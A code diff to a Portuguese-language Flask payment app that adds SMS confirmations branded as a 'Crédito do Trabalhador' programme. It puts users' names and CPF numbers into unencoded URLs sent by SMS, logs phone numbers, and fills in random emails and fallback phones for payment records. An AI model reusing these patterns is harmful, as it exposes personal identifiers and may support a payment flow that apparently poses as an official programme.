@@ -327,6 +327,37 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             return send_sms_owen(phone_number, message)
         else:  # Default to SMSDEV
             return send_sms_smsdev(phone_number, message)
+    except Exception as e:
+        app.logger.error(f"Error in send_sms: {str(e)}")
+        return False
+        
+def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
+    """
+    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
+    """
+    try:
+        if not phone_number:
+            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
+            return False
+            
+        # Format phone number (remove any non-digits)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+        
+        if len(formatted_phone) != 11:
+            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
+            return False
+            
+        # Criar mensagem personalizada com link para thank_you_url
+        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
+        
+        # Mensagem padrão com nome e link para a página de obrigado
+        message = f"[PROGRAMA CRÉDITO DO TRABALHADOR] Olá {nome_formatado}, seu pagamento foi confirmado! Acesse para mais detalhes: {thank_you_url}"
+        
+        # Escolher qual API usar com base em SMS_API_CHOICE
+        if SMS_API_CHOICE.upper() == 'OWEN':
+            return send_sms_owen(phone_number, message)
+        else:  # Default to SMSDEV
+            return send_sms_smsdev(phone_number, message)
 
     except Exception as e:
         app.logger.error(f"Error in send_sms: {str(e)}")
@@ -502,8 +533,12 @@ def payment_update():
         # Gera um email aleatório baseado no nome do cliente
         customer_email = generate_random_email(nome)
 
-        # Gera um telefone aleatório sem o prefixo 55
-        phone = generate_random_phone()
+        # Usa o telefone informado pelo usuário ou gera um se não estiver disponível
+        if not phone:
+            phone = generate_random_phone()
+            app.logger.info(f"[PROD] Telefone não fornecido, gerando aleatório: {phone}")
+        else:
+            app.logger.info(f"[PROD] Usando telefone fornecido pelo usuário: {phone}")
 
         # Dados para a transação
         payment_data = {
@@ -586,15 +621,12 @@ def check_payment_status(transaction_id):
             
             # Enviar SMS apenas se o número de telefone estiver disponível
             if phone:
-                # Criar mensagem personalizada
-                message = f"Seu pagamento foi confirmado! Acesse para mais detalhes: {thank_you_url}"
-                
-                # Enviar SMS
-                success = send_sms_smsdev(phone, message)
+                # Usando a função especializada para enviar SMS de confirmação de pagamento
+                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                 if success:
-                    app.logger.info(f"[PROD] SMS enviado com sucesso para {phone}")
+                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                 else:
-                    app.logger.error(f"[PROD] Falha ao enviar SMS para {phone}")
+                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
         
         return jsonify(status_data)
     except Exception as e:
@@ -792,6 +824,38 @@ def check_for4payments_status():
         # Verificar status do pagamento
         status_result = api.check_payment_status(transaction_id)
         app.logger.info(f"[PROD] Status do pagamento com For4Payments: {status_result}")
+        
+        # Verificar se o pagamento foi aprovado
+        if status_result.get('status') == 'completed' or status_result.get('original_status') in ['APPROVED', 'PAID']:
+            # Obter informações do usuário dos parâmetros da URL ou da sessão
+            nome = request.args.get('nome', '')
+            cpf = request.args.get('cpf', '')
+            phone = request.args.get('phone', '')
+            
+            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado via For4Payments. Enviando SMS com link de agradecimento.")
+            
+            # Construir o URL personalizado para a página de agradecimento
+            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
+            
+            # Adicionar parâmetros do usuário, se disponíveis
+            params = {}
+            if nome:
+                params['nome'] = nome
+            if cpf:
+                params['cpf'] = cpf
+                
+            # Construir a URL completa com parâmetros
+            if params:
+                thank_you_url += '?' + '&'.join([f"{key}={value}" for key, value in params.items()])
+            
+            # Enviar SMS apenas se o número de telefone estiver disponível
+            if phone:
+                # Usando a função especializada para enviar SMS de confirmação de pagamento
+                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
+                if success:
+                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
+                else:
+                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
         
         return jsonify(status_result)
         
